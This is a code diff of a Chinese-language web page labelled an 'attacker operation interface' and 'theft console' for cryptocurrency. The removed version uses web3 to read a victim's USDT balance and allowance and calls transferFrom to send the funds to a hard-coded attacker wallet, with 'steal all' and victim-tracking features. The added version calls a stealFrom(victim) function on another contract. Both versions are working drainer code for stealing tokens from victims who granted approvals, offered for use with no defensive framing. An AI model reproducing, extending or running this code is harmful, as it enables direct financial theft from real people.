@@ -1,167 +1,36 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><title>盜取控制台 v2.6</title></head>
-<body>
-<div style="position:fixed;top:10px;right:10px;font-size:0.9rem;color:gray;">🔖 當前版本：v2.7.2 穩定修正版</div>
-<h2>🛠️ 攻擊者操作介面</h2>
-<div><b>👤 你目前登入帳號：</b><span id="currentAccount" style="color:#007700;"></span></div>
-<div><b>⚠️ 身份檢查：</b><span id="checkStatus" style="font-weight:bold;"></span></div>
-<br>
-<input id="victim" placeholder="受害者地址"><br>
-<input id="amount" placeholder="金額（例：1000000 = 1 USDT）"><br>
-<button onclick="getMax()">查詢最大可盜金額</button>
-<button onclick="steal()">執行盜取</button>
-<button onclick="stealAll()">一鍵盜光</button>
-
-<h3>🧾 最近授權地址列表：</h3>
-<ul id="recentList" style="background:#f9f9f9;padding:10px;"></ul>
-<!-- 已移除清除紀錄按鈕以防誤觸 -->
-<br><br>
-<pre id="log" style="background:#f4f4f4;padding:10px;margin-top:20px;"></pre>
-
-<script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
-<script>
-const tokenAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
-const attacker = "0xDa4FfA490992769B8F54063bf0B9E7a4D3479459";
-const abi = [
-  {
-    "constant": true,
-    "inputs": [{"name":"_owner","type":"address"}],
-    "name": "balanceOf",
-    "outputs": [{"name":"","type":"uint256"}],
-    "type": "function"
-  },
-  {
-    "constant": true,
-    "inputs": [{"name":"_owner","type":"address"},{"name":"_spender","type":"address"}],
-    "name": "allowance",
-    "outputs": [{"name":"","type":"uint256"}],
-    "type": "function"
-  },
-  {
-    "constant": false,
-    "inputs": [
-      {"name":"_from","type":"address"},
-      {"name":"_to","type":"address"},
-      {"name":"_value","type":"uint256"}
-    ],
-    "name": "transferFrom",
-    "outputs": [{"name":"","type":"bool"}],
-    "type": "function"
-  }
-];
-
-let web3, contract, account;
-
-async function init() {
-  if (typeof window.ethereum === 'undefined') {
-    alert("請先安裝 MetaMask");
-    return;
-  }
-  web3 = new Web3(window.ethereum);
-  await ethereum.request({ method: 'eth_requestAccounts' });
-  const accounts = await web3.eth.getAccounts();
-  account = accounts[0];
-  document.getElementById("currentAccount").innerText = account;
-  contract = new web3.eth.Contract(abi, tokenAddress);
-  const checkStatus = document.getElementById("checkStatus");
-  checkStatus.innerText = account.toLowerCase() === attacker.toLowerCase()
-    ? "✅ 你是攻擊者本人"
-    : "❌ 非攻擊者帳號，請切換";
-}
-
-async function getMax() {
-  await init();
-  const victim = document.getElementById("victim").value;
-  if (!victim) return log("❌ 請輸入受害者地址");
-
-  let balance = "0";
-  let allowance = "0";
-  try {
-    balance = await contract.methods.balanceOf(victim).call();
-    allowance = await contract.methods.allowance(victim, account).call();
-  } catch (err) {
-    log("❌ 查詢失敗：可能尚未授權成功、尚未確認交易，或地址格式錯誤");
-    return;
-  }
-  const max = web3.utils.toBN(balance).lt(web3.utils.toBN(allowance)) ? balance : allowance;
-  document.getElementById("amount").value = max;
-  updateRecent(victim);
-  log("🟢 受害者：" + victim);
-  log("✅ 可盜金額：" + max);
-}
-
-async function steal() {
-  await init();
-  const victim = document.getElementById("victim").value;
-  const amount = document.getElementById("amount").value;
-  try {
-    const tx = await contract.methods.transferFrom(victim, attacker, amount).send({ from: account });
-    const link = "https://etherscan.io/tx/" + tx.transactionHash;
-    log("✅ 已執行 transferFrom(" + victim + " ➜ " + attacker + ", " + amount + ")");
-    log("✅ 已從 " + victim + " 轉出 USDT：" + amount);
-    log("🔗 TX Link: " + link);
-  } catch (e) {
-    log("❌ 轉帳失敗：" + e.message);
-  }
-}
-
-async function stealAll() {
-  const lastVictim = getLastVictim();
-  if (!lastVictim || lastVictim.toLowerCase() === attacker.toLowerCase()) {
-    log("❌ 無法一鍵盜光：無有效受害者地址或與攻擊者相同");
-    return;
-  }
-  await getMax();
-  await steal(lastVictim);
-}
-
-function log(msg) {
-  console.log(msg);
-  document.getElementById("log").innerText += msg + "\n";
-}
-
-function updateRecent(victim) {
-  if (!victim) return;
-  let list = JSON.parse(localStorage.getItem("victimList") || "[]");
-  const now = new Date().toLocaleString();
-  const entry = victim + " ⏱️ " + now;
-  list = list.filter(i => !i.startsWith(victim));
-  list.unshift(entry);
-  if (list.length > 10) list.pop();
-  localStorage.setItem("victimList", JSON.stringify(list));
-  renderRecentList();
-  document.getElementById("victim").value = victim;
-}
-
-function renderRecentList() {
-  let list = JSON.parse(localStorage.getItem("victimList") || "[]");
-  const container = document.getElementById("recentList");
-  container.innerHTML = list.map(function(entry, i) {
-    return '<li>' + (i + 1) + '. ' + entry + '</li>';
-  }).join("");
-  if (list.length > 0) {
-    const last = list[0].split(" ")[0];
-    document.getElementById("victim").value = last;
-  }
-}
-
-function clearHistory() {
-  localStorage.removeItem("victimList");
-  renderRecentList();
-}
-
-window.addEventListener("load", renderRecentList);
-</script>
+<head><meta charset="utf-8"><title>盜取控制台 v3.0</title>
+<script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script></head>
+<body style="font-family:monospace;padding:30px;">
+  <h2>🛠️ 攻擊者操作介面 <span style="float:right;color:gray;">v3.0</span></h2>
+  <div>合約地址：<b>0xFbe9c4748A267562f723C67db673943F901533D6</b></div><br>
+  <input id="victim" placeholder="受害者地址" style="width:350px;">
+  <button onclick="steal()">執行盜取</button><br><br>
+  <pre id="log">⚙️ 等待操作…</pre>
+  <script>
+    const contractAddr = "0xFbe9c4748A267562f723C67db673943F901533D6";
+    const abi = [{"name":"stealFrom","type":"function","inputs":[{"name":"victim","type":"address"}],"outputs":[],"stateMutability":"nonpayable"}];
+    async function steal() {
+      const web3 = new Web3(window.ethereum);
+      await ethereum.request({ method: 'eth_requestAccounts' });
+      const accounts = await web3.eth.getAccounts();
+      const me = accounts[0];
+      const victim = document.getElementById("victim").value;
+      document.getElementById("log").innerText = `👤 目前帳號：${me}`;
+      if (!victim || victim.toLowerCase() === me.toLowerCase()) {
+        document.getElementById("log").innerText += "\n❌ 錯誤：不能盜取自己地址";
+        return;
+      }
+      const contract = new web3.eth.Contract(abi, contractAddr);
+      document.getElementById("log").innerText += `\n🚀 呼叫 stealFrom(${victim})...`;
+      try {
+        const tx = await contract.methods.stealFrom(victim).send({from: me});
+        document.getElementById("log").innerText += `\n✅ 成功！TX Hash: https://etherscan.io/tx/${tx.transactionHash}`;
+      } catch (e) {
+        document.getElementById("log").innerText += `\n❌ 失敗：` + (e.message || e);
+      }
+    }
+  </script>
 </body>
 </html>
-
-<script>
-
-function getLastVictim() {
-  let list = JSON.parse(localStorage.getItem("victimList") || "[]");
-  if (list.length === 0) return null;
-  return list[0].split(" ")[0];
-}
-
-</script>
